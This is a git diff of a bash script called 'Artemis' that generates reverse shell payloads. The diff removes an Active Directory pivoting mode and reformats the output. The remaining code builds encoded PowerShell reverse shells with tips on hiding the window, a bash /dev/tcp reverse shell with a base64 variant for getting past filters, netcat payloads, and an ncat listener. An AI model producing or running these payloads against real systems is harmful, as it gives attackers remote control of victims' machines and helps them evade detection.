@@ -1,9 +1,8 @@
 #!/bin/bash
 
 #To-DO: Add Ruby & Perl payloads
-line="\n============================================================\n"
+line="============================================================"
 listen=""
-ad=""
 opt=""
 
 Help()
@@ -13,7 +12,6 @@ Artemis will run in interactive mode unless required arguments are supplied.
 
 [Options]
 	-h: Display this help menu
-	-a: Generate commands for pivoting in Active Directory, instead of reverse shell payloads. If used, all other arguments will be ignored
 	-i <IP_ADDRESS>: Your listener's IP Address
 	-p <PORT>: Your listener's port
 	-l: Start a listener using specified interface and port
@@ -53,56 +51,28 @@ PowerSHELL()
   payload=$(echo -n "$text; $ops" | pwsh -Command -)
 }
 
-if [ $# -eq 0 ]; then
-  echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
-else
-  while getopts ":hi:p:ls:t:a" option; do
-    case $option in
-      h)
-        Help
-        ;;
-      i)
-        host="$OPTARG"
-        ;;
-      p)
-        port="$OPTARG"
-        ;;
-      l)
-        listen=1
-        ;;
-
-      s)
-        shell="$OPTARG"
-        ;;
-      t)
-        target="$OPTARG"
-        ;;
-      a)
-        ad=0
-        ;;
-      \?)
-        echo -e "\nError: Invalid argument"
-        Help
-        ;;
-    esac
-  done
-fi
-
-if [[ -z "$ad" && $# -eq 0 ]]; then
-  echo -e "\nSelect an operation:\n[1] Generate Reverse shell payload\n[2] Perform Active Directory pivoting\n"
-  read pivot
-
-  if [[ "$pivot" == "2" ]]; then
-    ad=0
-  else
-    ad=1
-  fi
-fi
-
-if [[ "$ad" == "0" ]]; then
-  source $(readlink $(which artemis) | awk -F 'artemis.sh' '{print $1}')ad_LateralMove.sh
-  exit
-fi
+while getopts "hi:p:ls:t:" option; do
+  case $option in
+    h)
+      Help
+      ;;
+    i)
+      host="$OPTARG"
+      ;;
+    p)
+      port="$OPTARG"
+      ;;
+    l)
+      listen="1"
+      ;;
+    s)
+      shell="$OPTARG"
+      ;;
+    t)
+      target="$OPTARG"
+      ;;
+  esac
+done
 
 if [[ -z "$host" ]]; then
   echo -e "\nThe following interfaces have been detected:\n"
@@ -133,29 +103,59 @@ EOF
   read shell
 fi
 
-case $shell in
+case "$shell" in
   ps|1)
-    echo -e "\nOutputting an Encoded Powershell payload for $host:$port\n"
     PowerSHELL
+    
+    cat <<EOF
+$line
 
-    echo -e "\n[!] Tip: The Basic Syntax is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in. You can try to force the target to run Powershell (x64) using the x64 Syntax\n\n$line"
+[PowerShell $host:$port] 
 
-    echo -e "\nBasic Syntax:\n\npowershell -enc $payload"
+The basic payload is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in
 
-    echo -e "\n\nx64 Syntax:\n\n"
-    echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc $payload"
+You can try to force the target to run Powershell (x64) using the x64 Syntax
 
-    echo -e "\n\n[+] Additional Arguments: Optionally add other parameters like '-NoP' (NoProfile) & '-W Hidden' (Hide terminal on the target machine)\n$line" 
+[+] Additional Arguments: Optionally add other parameters like '-NoP' (NoProfile) & '-W Hidden' (Hide terminal on the target machine)
+
+$line
+
+{Basic Payload}
+
+powershell -enc $payload
+
+$line
+
+{x64 Payload}
+
+C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -enc $payload
+
+EOF
     ;;
   bash|2)
-    echo -e "\nOutputting Bash payloads for $host:$port\n\n" 
-    echo -e "[!] Tip: URL-Encoding the Basic Payload can break it. Try the B64 Payload if you need to URL-Encode it, or bypass basic filters\n\n"
-
     basic="bash -i >& /dev/tcp/$host/$port 0>&1"
     b64=$(echo -n "$basic" | base64)
 
-    echo -e "Basic Payload:\n$basic"
-    echo -e "\n\nB64 Payload:\necho $b64|base64 -d|bash"
+    cat <<EOF
+$line
+
+[Bash $host:$port]
+
+URL-Encoding the basic payload can break it. Try the B64 payload if you need to URL-Encode it, or bypass filters
+
+$line
+
+{Basic Payload}
+
+$basic
+
+$line
+
+{B64 Payload}
+
+echo $b64|base64 -d|bash
+
+EOF
     ;;
   nc|3)
     echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
@@ -325,17 +325,6 @@ else
 fi
 
 echo -e "$line"
-
-if [[ -z "$listen" ]]; then
-  echo -e "\nDo you want to automatically start a listener? [y/N]\n\n"
-  read opt
-  echo -e $line
-  if [[ "$opt" == "y" ]]; then
-    listen=1
-  else
-    exit
-  fi
-fi
 
 if [[ "$listen" == "1" ]]; then
   rlwrap ncat -lvnp "$port"
